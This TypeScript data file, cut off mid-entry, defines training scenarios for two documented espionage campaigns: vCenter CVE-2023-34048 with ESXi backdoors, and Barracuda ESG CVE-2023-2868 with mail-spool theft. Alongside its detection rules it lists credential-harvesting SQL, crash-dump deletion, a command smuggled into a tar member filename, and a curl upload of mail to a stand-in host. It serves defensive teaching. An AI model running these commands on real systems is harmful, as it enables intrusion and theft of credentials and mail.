import { AttackScenario } from './types';

/**
 * ============================================================================
 * AUTHORITATIVE APT & ZERO-DAY SCENARIOS — BATCH 3 (VIRTUALIZATION & APPLIANCES)
 * ============================================================================
 * Multi-Source Verified Scenarios:
 * 11. Mandiant UNC3886 VMware vCenter CVE-2023-34048 & VIRTUALPITA/VIRTUALPIE — Mandiant, VMware, CISA
 * 12. Mandiant UNC4841 Barracuda ESG CVE-2023-2868 & SALTWATER/SEASPY — Mandiant, CISA, Barracuda
 * 13. Cisco Talos IOS XE CVE-2023-20198 / CVE-2023-20273 & BadCandy Implant — Cisco Talos, VulnCheck, CISA
 * 14. Zyxel Firewall IKEv2 CVE-2023-28771 Pre-Auth RCE — TRAPA Security, Rapid7, CISA, Shadowserver
 * 15. Juniper Junos J-Web CVE-2023-36845 PHPRC Fileless RCE — watchTowr Labs, VulnCheck, Juniper SIRT, CISA
 */

export const VMWARE_VCENTER_CVE_2023_34048_UNC3886_SCENARIO: AttackScenario = {
  id: 'vmware-vcenter-cve-2023-34048-unc3886',
  code: 'CVE-2023-34048',
  name: 'Mandiant, VMware & CISA — UNC3886: vCenter vmdird Out-of-Bounds Write & ESXi VIRTUALPITA Backdoor',
  shortSubtitle: 'Mandiant UNC3886 · VMSA-2023-0023 · vmdird DCERPC OOB Write, vpxuser & AF_VSOCK Backdoors',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented by Mandiant (Google Cloud), VMware VMSA-2023-0023, and CISA KEV (October 2023–June 2024), China-nexus espionage group UNC3886 exploited CVE-2023-34048 (CVSS 9.8) as a zero-day for over two years against VMware vCenter Server appliances. By sending crafted DCERPC packets to the VMware Directory Service daemon (vmdird on TCP/2012), the attacker triggered an out-of-bounds heap write to gain root RCE on vCenter, extracted encrypted ESXi host service credentials (vpxuser) from the embedded vPostgreSQL database, and installed unsigned VIB backdoors (VIRTUALPITA and VIRTUALPIE) onto ESXi hypervisors that communicate covertly with guest VMs over VMCI / AF_VSOCK sockets.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Mandiant UNC3886 Research · VMware VMSA-2023-0023 · CISA KEV CVE-2023-34048',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Exploit vCenter DCERPC) · T1552.001 (vpxuser DB Creds) · T1547 (ESXi VIB: VIRTUALPITA)',
    },
    {
      term: 'HYPERVISOR IMPLANTS',
      value: 'VIRTUALPITA (ESXi C Backdoor) & VIRTUALPIE (Python Backdoor) over AF_VSOCK',
    },
    {
      term: 'KEY TELEMETRY PATH',
      value: 'vmdird Crash/Core Dump -> vPostgreSQL VPX_HOST -> ESXi esxcli software vib install',
    },
  ],
  nodes: [
    {
      id: 'unc3886_operator',
      label: 'UNC3886 Threat Actor',
      sublabel: '10.20.8.99 (DCERPC Exploit Origin)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'UNC3886 Pivot Host (Targeting Virtualization Control Plane)',
        pidOrPort: 'TCP :2012 / :135 (DCERPC to vmdird)',
        privilege: 'Unauthenticated Network Access to vCenter',
        artifacts: [
          'Crafted DCERPC bind/request triggering OOB write in vmdird',
          'Unsigned ESXi VIB archive (.vib) containing VIRTUALPITA',
        ],
        description:
          'UNC3886 operator targeting VMware vCenter’s DCERPC directory service (vmdird) to hijack the entire hypervisor management plane.',
      },
    },
    {
      id: 'vcenter_vmdird_server',
      label: 'VMware vCenter Server (VCSA)',
      sublabel: '10.10.2.10 (vmdird TCP :2012)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'VMware vCenter Server Appliance (Photon OS Linux)',
        pidOrPort: 'PID 1984 (/usr/lib/vmware-vmdir/sbin/vmdird)',
        privilege: 'root (UID 0)',
        artifacts: [
          '/usr/lib/vmware-vmdir/sbin/vmdird',
          '/var/core/core.vmdird.* (Cleaned by attacker after RCE)',
        ],
        description:
          'vCenter Server Appliance where an out-of-bounds write in the DCERPC protocol implementation of vmdird grants unauthenticated root code execution.',
      },
    },
    {
      id: 'vpostgres_vpxuser_decrypt',
      label: 'vPostgreSQL & symkey.dat Extractor',
      sublabel: 'VPX_HOST Table + /etc/vmware-vpx/ssl/symkey.dat',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'vCenter Database Credential Harvester',
        pidOrPort: 'PID 6410 (psql -U postgres -d VCDB)',
        privilege: 'root on vCenter Appliance',
        artifacts: [
          'SELECT ip_address, user_name, password FROM VPX_HOST;',
          '/etc/vmware-vpx/ssl/symkey.dat (AES Decryption Key for vpxuser)',
        ],
        description:
          'Queries the local VCDB PostgreSQL database for encrypted vpxuser passwords and decrypts them using vCenter’s master symmetric key (/etc/vmware-vpx/ssl/symkey.dat).',
      },
    },
    {
      id: 'esxi_virtualpita_vsock',
      label: 'ESXi Hypervisor (VIRTUALPITA)',
      sublabel: '10.10.2.21 (AF_VSOCK Port 5466 Backdoor)',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'VMware ESXi Hypervisor Kernel & Userworld',
        pidOrPort: 'AF_VSOCK CID 2 (Hypervisor) <-> Guest VM CID',
        privilege: 'ESXi Hypervisor Root (AcceptanceLevel = CommunitySupported)',
        artifacts: [
          'VIRTUALPITA (Masquerading as /usr/libexec/setsyslog / vmsyslogd)',
          'VIRTUALPIE (Python backdoor launched via /etc/rc.local.d/local.sh)',
        ],
        description:
          'Compromised ESXi hypervisor running VIRTUALPITA, which listens on a VMCI / AF_VSOCK socket to execute commands and transfer files to guest VMs while bypassing network firewalls.',
      },
    },
    {
      id: 'virtualization_siem',
      label: 'vSphere Syslog & SIEM Sensor',
      sublabel: 'vmdird Logs + ESXi vmkwarning.log',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC SIEM & Hypervisor Integrity Monitor',
        pidOrPort: '/var/log/vmware/vmdird/ + ESXi /var/log/syslog.log',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'vmdird crash within minutes of sshd / shell activity on VCSA',
          'ESXi Host Image Profile AcceptanceLevel lowered to CommunitySupported',
        ],
        description:
          'Detects vmdird service restarts/core dumps on vCenter, vpxuser logins to ESXi, and unsigned VIB installation events.',
      },
    },
  ],
  processTree: [
    {
      pid: 1984,
      ppid: 1,
      name: 'vmdird (VMware Directory Service)',
      commandLine: '/usr/lib/vmware-vmdir/sbin/vmdird -s',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['rpc__cn_network_select()', 'Heap_OOB_Write(CVE-2023-34048)', 'fork()'],
    },
    {
      pid: 6410,
      ppid: 1984,
      name: 'psql / vpxuser Decryptor',
      commandLine: '/opt/vmware/vpostgres/current/bin/psql -U postgres -d VCDB -c "SELECT ip_address,password FROM VPX_HOST"',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 2,
      apiCalls: [
        'open("/etc/vmware-vpx/ssl/symkey.dat")',
        'EVP_DecryptInit_ex(AES_128_CBC)',
      ],
    },
    {
      pid: 2098144,
      ppid: 1,
      name: 'vmsyslogd (VIRTUALPITA ESXi)',
      commandLine: '/usr/libexec/setsyslog (VIRTUALPITA listening on AF_VSOCK Port 5466)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 3,
      apiCalls: ['socket(AF_VSOCK, SOCK_STREAM, 0)', 'bind(VMADDR_CID_ANY, 5466)', 'execve("/bin/sh")'],
      memoryBlocks: [
        {
          address: '0x0000000000401000',
          section: 'VIRTUALPITA ELF64 Backdoor (ESXi Userworld)',
          permissions: 'R-X',
          size: '44 KB',
          status: 'injected',
          description:
            'Passive 64-bit ELF backdoor on ESXi binding to AF_VSOCK (Address Family 40) to bridge hypervisor and guest VMs without TCP/IP packets.',
          hexPreview: '7F 45 4C 46 02 01 01 00 | socket(AF_VSOCK=40, SOCK_STREAM=1) | port=5466',
        },
      ],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'VCENTER VMDIRD DCERPC OUT-OF-BOUNDS WRITE (CVE-2023-34048)',
      subtitle: 'Exploiting VMware Directory Service over TCP/2012 for unauthenticated root RCE',
      description:
        'UNC3886 sends a specially crafted DCERPC packet sequence to the VMware Directory Service daemon (/usr/lib/vmware-vmdir/sbin/vmdird) on the vCenter Server Appliance. Due to an out-of-bounds heap write vulnerability (CVE-2023-34048), the attacker corrupts vmdird memory to execute arbitrary commands as root—and immediately deletes any generated /var/core/core.vmdird.* crash dumps to hide the intrusion.',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application / Network Service',
      activeNodeIds: ['unc3886_operator', 'vcenter_vmdird_server', 'virtualization_siem'],
      compromisedNodeIds: ['vcenter_vmdird_server'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-34048 (CVSS 9.8 vmdird DCERPC OOB Write)' },
        { term: 'TARGET DAEMON', value: '/usr/lib/vmware-vmdir/sbin/vmdird (root)' },
        { term: 'ANTI-FORENSICS', value: 'Deletes /var/core/core.vmdird.* crash dumps post-RCE' },
      ],
    },
    {
      index: 2,
      title: 'EXTRACTING & DECRYPTING ESXI "VPXUSER" CREDENTIALS FROM VCDB',
      subtitle: 'Querying vPostgreSQL VPX_HOST and decrypting passwords with /etc/vmware-vpx/ssl/symkey.dat',
      description:
        'Because vCenter manages every ESXi hypervisor in the datacenter using a built-in root-equivalent service account named vpxuser, UNC3886 queries the local vPostgreSQL database (SELECT ip_address, user_name, password FROM VPX_HOST) and uses vCenter’s local symmetric key (/etc/vmware-vpx/ssl/symkey.dat) to decrypt the plaintext vpxuser password for every managed ESXi host.',
      mitreTacticPhase: 5,
      mitreTechniqueId: 'T1552.001',
      mitreTechniqueName: 'Unsecured Credentials: Credentials In Files',
      activeNodeIds: ['vcenter_vmdird_server', 'vpostgres_vpxuser_decrypt', 'virtualization_siem'],
      compromisedNodeIds: ['vcenter_vmdird_server', 'vpostgres_vpxuser_decrypt'],
      keySpecs: [
        { term: 'DATABASE TABLE', value: 'VCDB -> VPX_HOST (Encrypted vpxuser passwords)' },
        { term: 'DECRYPTION KEY', value: '/etc/vmware-vpx/ssl/symkey.dat (AES Master Key)' },
        { term: 'HARVESTED ACCOUNT', value: 'vpxuser (Root-equivalent service account on all ESXi hosts)' },
      ],
    },
    {
      index: 3,
      title: 'DEPLOYING VIRTUALPITA & VIRTUALPIE VIB BACKDOORS OVER AF_VSOCK',
      subtitle: 'Lowering ESXi AcceptanceLevel to install VIB implants that pivot via VMCI VSOCK sockets',
      description:
        'Authenticating to each ESXi hypervisor with the decrypted vpxuser credentials, UNC3886 lowers the host’s VIB verification setting (esxcli software acceptance set --level=CommunitySupported) and installs malicious VIB packages containing VIRTUALPITA and VIRTUALPIE. Instead of opening normal TCP/IP ports that network firewalls or NDR sensors could see, VIRTUALPITA listens on VMware’s Virtual Machine Communication Interface (AF_VSOCK)—allowing the attacker to hop silently between the ESXi hypervisor and any guest Virtual Machine!',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1547',
      mitreTechniqueName: 'Boot or Logon Autostart Execution: Hypervisor VIB Persistence',
      activeNodeIds: ['vpostgres_vpxuser_decrypt', 'esxi_virtualpita_vsock', 'virtualization_siem'],
      compromisedNodeIds: ['vcenter_vmdird_server', 'vpostgres_vpxuser_decrypt', 'esxi_virtualpita_vsock'],
      keySpecs: [
        { term: 'ESXI IMPLANTS', value: 'VIRTUALPITA (ELF64) & VIRTUALPIE (Python VIB)' },
        { term: 'COVERT CHANNEL', value: 'AF_VSOCK / VMCI (Hypervisor CID 2 <-> Guest VM CID)' },
        { term: 'GUEST VM PIVOT', value: 'CVE-2023-20867 (vmtoolsd Guest Operations Auth Bypass)' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'vmw-34048-1',
      no: 1,
      stageIndex: 1,
      timestamp: '02:09:14.118',
      sourceNodeId: 'unc3886_operator',
      targetNodeId: 'vcenter_vmdird_server',
      sourceLabel: '10.20.8.99',
      targetLabel: 'vCenter vmdird :2012',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'VCSA Syslog / vmdird',
      shortAction: 'VMDIRD DCERPC OOB',
      info: 'Malformed DCERPC packet triggers OOB heap write in /usr/lib/vmware-vmdir/sbin/vmdird (CVE-2023-34048)',
      sizeOrCode: 'UID 0 (root)',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Mandiant noted that CVE-2023-34048 exploitation often causes vmdird to crash and restart within minutes of unauthorized shell execution on the vCenter appliance.',
      rawLog: `2023-10-28T02:09:14.118Z vcsa-01.corp.local vmdird[1984]: [ERROR] DCE/RPC packet bounds check failure in VmDirRpcAllocateMemory
2023-10-28T02:09:15.004Z vcsa-01.corp.local systemd[1]: vmdird.service: Main process exited, code=dumped, status=11/SEGV
[ANTI_FORENSICS] rm -f /var/core/core.vmdird.*`,
      detectionRule: {
        type: 'SIGMA',
        title: 'VMware vCenter vmdird Crash Followed by Shell Execution or Core Deletion (CVE-2023-34048)',
        ruleCode: `title: VMware vCenter vmdird Exploitation & Core Dump Removal (UNC3886)
logsource:
  product: linux
  category: process_creation
detection:
  selection:
    CommandLine|contains:
      - '/var/core/core.vmdird'
      - '/etc/vmware-vpx/ssl/symkey.dat'
  condition: selection
level: critical`,
        mitigation:
          'Apply VMware VMSA-2023-0023 patches immediately and restrict network access to vCenter DCERPC ports (TCP 2012, 2014, 2020) to trusted management subnets.',
      },
    },
    {
      id: 'vmw-34048-2',
      no: 2,
      stageIndex: 2,
      timestamp: '02:11:40.512',
      sourceNodeId: 'vcenter_vmdird_server',
      targetNodeId: 'vpostgres_vpxuser_decrypt',
      sourceLabel: 'root@vcsa-01',
      targetLabel: 'VCDB (VPX_HOST) & symkey.dat',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'Auditd OPEN / EXECVE',
      shortAction: 'DECRYPT VPXUSER',
      info: 'Reads /etc/vmware-vpx/ssl/symkey.dat and queries VPX_HOST table to decrypt ESXi vpxuser passwords',
      sizeOrCode: 'AES-128-CBC',
      severity: 'CRITICAL',
      mitreId: 'T1552.001',
      explanation:
        'By combining the AES key in /etc/vmware-vpx/ssl/symkey.dat with the encrypted password column in the VPX_HOST table, UNC3886 recovers the root-level vpxuser password for every ESXi host.',
      rawLog: `type=EXECVE msg=audit(1698459100.512:3104): argc=6 a0="/opt/vmware/vpostgres/current/bin/psql" a1="-U" a2="postgres" a3="-d" a4="VCDB" a5="-c SELECT ip_address,user_name,password FROM VPX_HOST;"
[FILE_READ] /etc/vmware-vpx/ssl/symkey.dat -> Decrypted vpxuser credentials for 14 ESXi hypervisors`,
      detectionRule: {
        type: 'SIGMA',
        title: 'Unauthorized Access to vCenter Symmetric Key (symkey.dat)',
        ruleCode: `title: VMware vCenter symkey.dat Credential Harvesting
logsource:
  product: linux
  service: auditd
detection:
  selection:
    name: '/etc/vmware-vpx/ssl/symkey.dat'
  condition: selection
level: critical`,
        mitigation:
          'Rotate vCenter vpxuser passwords and monitor /var/log/vmware/vpxd/ for interactive SSH logins using the vpxuser service account.',
      },
    },
    {
      id: 'vmw-34048-3',
      no: 3,
      stageIndex: 3,
      timestamp: '02:15:08.902',
      sourceNodeId: 'vpostgres_vpxuser_decrypt',
      targetNodeId: 'esxi_virtualpita_vsock',
      sourceLabel: 'vpxuser@esxi-01',
      targetLabel: 'VIRTUALPITA (AF_VSOCK :5466)',
      sourceType: 'LINUX_AUDIT',
      protocolOrEventId: 'ESXi Syslog / YARA',
      shortAction: 'VIRTUALPITA VSOCK VIB',
      info: 'esxcli software vib install --no-sig-check deploys VIRTUALPITA listening on AF_VSOCK port 5466',
      sizeOrCode: 'AF_VSOCK CID 2',
      severity: 'CRITICAL',
      mitreId: 'T1547',
      explanation:
        'Mandiant discovered that UNC3886 installs unsigned VIBs on ESXi containing VIRTUALPITA, which binds to AF_VSOCK (socket family 40) to communicate covertly with guest VMs.',
      rawLog: `2023-10-28T02:15:08Z esxi-01.corp.local esxcli: [AcceptanceConfig] Host AcceptanceLevel changed from PartnerSupported to CommunitySupported
2023-10-28T02:15:09Z esxi-01.corp.local esxcli: [VibInstall] Installed unsigned VIB "vmsyslog-service" (/usr/libexec/setsyslog)
[VSOCK_LISTEN] pid=2098144 binary="/usr/libexec/setsyslog" family=AF_VSOCK(40) cid=2 port=5466`,
      detectionRule: {
        type: 'YARA',
        title: 'Mandiant Official YARA — UNC3886 VIRTUALPITA ESXi VSOCK Backdoor',
        ruleCode: `rule Mandiant_UNC3886_VIRTUALPITA_ESXi {
  meta:
    author = "Mandiant"
    reference = "UNC3886 CVE-2023-34048 ESXi Backdoor"
  strings:
    $s1 = "vmsyslogd" ascii
    $s2 = "/usr/libexec/setsyslog" ascii
    $vsock = { BE 01 00 00 00 BF 28 00 00 00 E8 } // socket(AF_VSOCK=0x28, SOCK_STREAM=1)
  condition:
    uint32(0) == 0x464c457f and ($vsock and 1 of ($s*))
}`,
        mitigation:
          'Enforce UEFI Secure Boot and TPM settings on ESXi 8.0+, audit installed VIBs via esxcli software vib list, and inspect open VSOCK listeners via lsof -A.',
      },
    },
  ],
};

export const BARRACUDA_ESG_CVE_2023_2868_UNC4841_SCENARIO: AttackScenario = {
  id: 'barracuda-esg-cve-2023-2868-unc4841',
  code: 'CVE-2023-2868',
  name: 'Mandiant & CISA — UNC4841: Barracuda ESG .tar Command Injection, SALTWATER & SEASPY Backdoors',
  shortSubtitle: 'Mandiant UNC4841 · CISA MAR · CVE-2023-2868 Perl qx() Injection, SALTWATER bsmtp & SEASPY PCAP',
  category: 'NETWORK_WEB',
  severity: 'CRITICAL',
  primaryMitrePhase: 1,
  overview:
    'Documented by Mandiant (UNC4841), CISA Malware Analysis Reports, and Barracuda Networks (May–August 2023), suspected China-nexus espionage group UNC4841 exploited CVE-2023-2868 (CVSS 9.8) in Barracuda Email Security Gateway (ESG) appliances. When the appliance’s email attachment scanner processed a specially crafted .tar archive whose internal filename began with a single quote and pipe (`\'|`), an unsanitized Perl qx`` / open() call executed the filename as a root shell command. UNC4841 deployed a suite of custom implants—including SALTWATER (a trojanized /usr/sbin/bsmtp module), SEASPY (a passive C/PCAP backdoor disguised as BarracudaMailService), and SUBMARINE (a persistent SQLite/cron rootkit)—exhibiting such deep persistence that Barracuda and CISA advised customers to physically replace compromised ESG hardware.',
  specs: [
    {
      term: 'PRIMARY SOURCES',
      value: 'Mandiant UNC4841 Report · CISA MAR-10454006 (SALTWATER / SEASPY / SUBMARINE) · Barracuda',
    },
    {
      term: 'MITRE TECHNIQUES',
      value: 'T1190 (Email Gateway Exploit) · T1059.004 (Perl Shell Injection) · T1505.003 (SALTWATER / SEASPY)',
    },
    {
      term: 'IMPLANT SUITE',
      value: 'SALTWATER (/usr/sbin/bsmtp) · SEASPY (BarracudaMailService PCAP) · SUBMARINE (SQLite)',
    },
    {
      term: 'REMEDIATION MANDATE',
      value: 'Complete replacement of compromised Barracuda ESG physical/virtual appliances',
    },
  ],
  nodes: [
    {
      id: 'unc4841_sender',
      label: 'UNC4841 SMTP Operator',
      sublabel: '198.51.100.201 (Crafted .tar Email Sender)',
      role: 'attacker',
      x: 14,
      y: 44,
      details: {
        osOrType: 'External Adversary SMTP Client (UNC4841)',
        pidOrPort: 'SMTP :25 (MIME Email with Malicious .tar Attachment)',
        privilege: 'Unauthenticated External Email Sender',
        artifacts: [
          'Attachment: document.tar containing filename "\'|sh -c ...#"',
          'Magic TCP SYN/ETLO packets triggering SEASPY / SALTWATER',
        ],
        description:
          'UNC4841 sending a single inbound phishing/crafted email over SMTP port 25 containing a .tar attachment with shell metacharacters in the member filename.',
      },
    },
    {
      id: 'barracuda_esg_scanner',
      label: 'Barracuda ESG Appliance',
      sublabel: '172.16.12.10 (SMTP Scanner & Perl Engine)',
      role: 'victim_host',
      x: 42,
      y: 28,
      details: {
        osOrType: 'Barracuda Email Security Gateway (Linux Appliance v5.1.3–9.2.0)',
        pidOrPort: 'PID 2810 (/usr/sbin/bsmtp & amavisd Perl scanner)',
        privilege: 'root (UID 0)',
        artifacts: [
          'Perl Archive::Tar / Spreadsheet::ParseExcel filename evaluation',
          '/mail/tmp/attachment_scan/',
        ],
        description:
          'Email Security Gateway appliance that automatically extracts and inspects inbound .tar attachments before delivering email to the internal mail server.',
      },
    },
    {
      id: 'saltwater_seaspy_implant',
      label: 'SALTWATER & SEASPY Implants',
      sublabel: '/usr/sbin/bsmtp & BarracudaMailService',
      role: 'process',
      x: 56,
      y: 72,
      details: {
        osOrType: 'Trojanized SMTP Daemon & libpcap Passive Backdoor',
        pidOrPort: 'PID 3190 (BarracudaMailService / SEASPY on eth0)',
        privilege: 'root (UID 0)',
        artifacts: [
          'SALTWATER: Trojanized /usr/sbin/bsmtp hooking SMTP EHLO/HELO',
          'SEASPY: /usr/sbin/BarracudaMailService (libpcap filter on TCP port 25/587)',
        ],
        description:
          'SALTWATER hooks the legitimate Barracuda SMTP daemon (bsmtp), while SEASPY uses libpcap to sniff eth0 for magic TCP packets without opening any new listening port.',
      },
    },
    {
      id: 'submarine_mail_exfil',
      label: 'SUBMARINE & Mail Spool Exfil',
      sublabel: '/etc/init.d/ee SQLite Trigger & /mail/ Box',
      role: 'server',
      x: 78,
      y: 26,
      details: {
        osOrType: 'Appliance Configuration DB & Corporate Email Spool',
        pidOrPort: 'SQLite Trigger + /etc/init.d/ee',
        privilege: 'Appliance Root & Mail Intercept',
        artifacts: [
          'SUBMARINE: Malicious SQL trigger inside Barracuda SQLite DB',
          'Exfiltrated government/diplomatic MIME email archives (.tar.gz)',
        ],
        description:
          'SUBMARINE hides persistence inside SQLite database triggers and /etc/init.d/ee to survive firmware updates while exfiltrating sensitive corporate email traffic.',
      },
    },
    {
      id: 'esg_siem_yara_sensor',
      label: 'CISA YARA & NDR Sensor',
      sublabel: 'Zeek SMTP + CISA MAR YARA Rules',
      role: 'firewall_siem',
      x: 86,
      y: 66,
      details: {
        osOrType: 'SOC Network Detection & Appliance Forensics',
        pidOrPort: 'Zeek SMTP Attachment Analyzer & Linux Audit',
        privilege: 'SOC Detection Engine',
        artifacts: [
          'CISA YARA: CISA_10454006_SALTWATER / SEASPY / SUBMARINE',
          'Outbound HTTPS/DNS tunneling from Barracuda ESG management IP',
        ],
        description:
          'Detects .tar attachments with backtick/pipe filenames on SMTP port 25 and unexpected outbound C2 connections from the Barracuda ESG appliance.',
      },
    },
  ],
  processTree: [
    {
      pid: 2810,
      ppid: 1,
      name: 'amavisd / Perl .tar Scanner',
      commandLine: '/usr/bin/perl /usr/sbin/amavisd (scanning inbound .tar attachment)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'suspicious',
      activeFromStage: 1,
      apiCalls: ['Archive::Tar->list_files()', 'qx/file \'$filename\'/', 'execve("/bin/sh")'],
    },
    {
      pid: 3190,
      ppid: 1,
      name: 'BarracudaMailService (SEASPY)',
      commandLine: '/usr/sbin/BarracudaMailService eth0 (libpcap passive sniffer)',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'injected',
      activeFromStage: 2,
      apiCalls: [
        'pcap_open_live("eth0", 65535, 1)',
        'pcap_compile("tcp dst port 25 or 587")',
        'openpty() -> /bin/sh',
      ],
      memoryBlocks: [
        {
          address: '0x00007F2C10800000',
          section: 'SALTWATER (/usr/sbin/bsmtp) & SEASPY (libpcap)',
          permissions: 'R-X',
          size: '142 KB',
          status: 'injected',
          description:
            'Trojanized /usr/sbin/bsmtp binary containing 6 encrypted RC4 modules (Upload, Download, Proxy, Shell, Tunnel).',
          hexPreview: 'SALTWATER RC4 Module Table + SEASPY pcap_loop("eth0") magic packet trigger',
        },
      ],
    },
    {
      pid: 4419,
      ppid: 3190,
      name: 'sh (SUBMARINE / Mail Exfil)',
      commandLine: '/bin/sh -c tar -czf /tmp/.m.tgz /mail/ && curl -k -F "data=@/tmp/.m.tgz" https://198.51.100.201:443/',
      user: 'root',
      integrity: 'SYSTEM',
      status: 'malicious',
      activeFromStage: 3,
      apiCalls: ['sqlite3_exec("CREATE TRIGGER ...")', 'connect(198.51.100.201:443)'],
    },
  ],
  stages: [
    {
      index: 1,
      title: 'MALICIOUS .TAR ATTACHMENT FILENAME INJECTION (CVE-2023-2868)',
      subtitle: 'Sending an email with a .tar archive whose member filename triggers Perl qx() execution',
      description:
        'UNC4841 sends an external email to the organization over SMTP port 25 containing a crafted .tar attachment. Even before any recipient receives the email, the Barracuda ESG appliance extracts the .tar archive to scan its contents. Because CVE-2023-2868 passed the archive member’s filename directly into a Perl backtick/open statement without escaping single quotes or pipes (e.g., `\'|sh -c "wget ..."`), the email scanner executes the filename as a root shell command!',
      mitreTacticPhase: 1,
      mitreTechniqueId: 'T1190',
      mitreTechniqueName: 'Exploit Public-Facing Application',
      activeNodeIds: ['unc4841_sender', 'barracuda_esg_scanner', 'esg_siem_yara_sensor'],
      compromisedNodeIds: ['barracuda_esg_scanner'],
      keySpecs: [
        { term: 'VULNERABILITY', value: 'CVE-2023-2868 (CVSS 9.8 Unauthenticated SMTP .tar RCE)' },
        { term: 'TRIGGER VECTOR', value: 'Inbound MIME Email with crafted .tar member filename' },
        { term: 'PERL SINK', value: 'Unsanitized filename interpolation inside Perl qx() / open()' },
      ],
    },
    {
      index: 2,
      title: 'IMPLANTING "SALTWATER" (BSMTP) & "SEASPY" (PCAP SNIFFER)',
      subtitle: 'Trojanizing /usr/sbin/bsmtp and launching the libpcap-based BarracudaMailService backdoor',
      description:
        'With root access on the Barracuda appliance, UNC4841 deploys two complementary backdoors documented by Mandiant and CISA: (1) SALTWATER, a trojanized version of the legitimate Barracuda SMTP daemon (/usr/sbin/bsmtp) containing 6 RC4-encrypted modules for tunneling and command execution; and (2) SEASPY, a modified cd00r-style passive backdoor masquerading as /usr/sbin/BarracudaMailService that uses libpcap to sniff eth0 on TCP ports 25 and 587 for a magic knock sequence without binding any new network socket.',
      mitreTacticPhase: 3,
      mitreTechniqueId: 'T1505.003',
      mitreTechniqueName: 'Server Software Component: Mail Server / Appliance Implant',
      activeNodeIds: ['barracuda_esg_scanner', 'saltwater_seaspy_implant', 'esg_siem_yara_sensor'],
      compromisedNodeIds: ['barracuda_esg_scanner', 'saltwater_seaspy_implant'],
      keySpecs: [
        { term: 'SALTWATER', value: 'Trojanized /usr/sbin/bsmtp with 6 RC4-encrypted C2 modules' },
        { term: 'SEASPY', value: '/usr/sbin/BarracudaMailService (libpcap eth0 packet sniffer)' },
        { term: 'STEALTH DESIGN', value: 'Zero extra listening TCP/UDP ports visible in netstat' },
      ],
    },
    {
      index: 3,
      title: 'DEEP PERSISTENCE VIA "SUBMARINE" & EMAIL SPOOL EXFILTRATION',
      subtitle: 'Hiding inside SQLite database triggers to survive patches and exfiltrating corporate mail',
      description:
        'When Barracuda pushed emergency cleanup scripts in May 2023, UNC4841 rapidly countered by deploying SUBMARINE—a persistent implant hidden inside SQLite database triggers and /etc/init.d/ee that automatically re-executes whenever the appliance’s database is queried, surviving standard firmware updates. Because the rootkit compromised the underlying Linux image and certificates, Barracuda and CISA issued an extraordinary directive to physically decommission and replace all affected ESG appliances.',
      mitreTacticPhase: 7,
      mitreTechniqueId: 'T1114.002',
      mitreTechniqueName: 'Email Collection: Remote Email Collection',
      activeNodeIds: ['unc4841_sender', 'saltwater_seaspy_implant', 'submarine_mail_exfil', 'esg_siem_yara_sensor'],
      compromisedNodeIds: ['barracuda_esg_scanner', 'saltwater_seaspy_implant', 'submarine_mail_exfil'],
      keySpecs: [
        { term: 'SUBMARINE', value: 'Malicious SQLite Trigger + /etc/init.d/ee Rootkit' },
        { term: 'EXFILTRATED DATA', value: 'Targeted MIME email spools, attachments & LDAP credentials' },
        { term: 'VENDOR DIRECTIVE', value: 'Full hardware/virtual appliance replacement required' },
      ],
    },
  ],
  telemetry: [
    {
      id: 'esg-2868-1',
      no: 1,
      stageIndex: 1,
      timestamp: '05:12:08.401',
      sourceNodeId: 'unc4841_sender',
      targetNodeId: 'barracuda_esg_scanner',
      sourceLabel: '198.51.100.201',
      targetLabel: 'Barracuda ESG :25',
      sourceType: 'NETWORK',
      protocolOrEventId: 'SMTP .tar Attachment',
      shortAction: 'TAR FILENAME RCE',
      info: 'Inbound SMTP email carrying .tar attachment with filename "\'|sh -c ..." (CVE-2023-2868)',
      sizeOrCode: 'UID 0 (root)',
      severity: 'CRITICAL',
      mitreId: 'T1190',
      explanation:
        'Mandiant and CISA documented that CVE-2023-2868 triggers automatically during pre-delivery attachment scanning of a .tar file whose member filename contains shell metacharacters.',
      rawLog: `[SMTP_INGRESS] MAIL FROM:<update@external-sender.com> RCPT TO:<info@corp.local>
Content-Type: application/x-tar; name="invoice_scan.tar"
[TAR_HEADER] member_name="'|sh -c 'curl -k https://198.51.100.201/init.sh | sh'#"`,
      detectionRule: {
        type: 'SURICATA',
        title: 'ET EXPLOIT Barracuda ESG CVE-2023-2868 Malicious .tar Filename Command Injection',
        ruleCode: `alert smtp any any -> $HOME_NET 25 (msg:"CISA Barracuda ESG CVE-2023-2868 TAR Filename Shell Injection"; flow:established,to_server; content:"ustar"; fast_pattern; content:"|27 7c|"; sid:2045992; rev:1;)`,
        mitigation:
          'Immediately isolate and decommission compromised Barracuda ESG appliances (v5.1.3.001–9.2.0.006) and rotate all LDAP/AD credentials connected to the appliance.',
      },
    },
    {
      id: 'esg-2868-2',
      no: 2,
      stageIndex: 2,
      timestamp: '05:12:14.772',
      sourceNodeId: 'barracuda_esg_scanner',
      targetNodeId: 'saltwater_seaspy_implant',
      sourceLabel: '/usr/sbin/bsmtp',
      targetLabel: 'BarracudaMailService (SEASPY)',
      sourceType: 'LINUX_AUDIT',
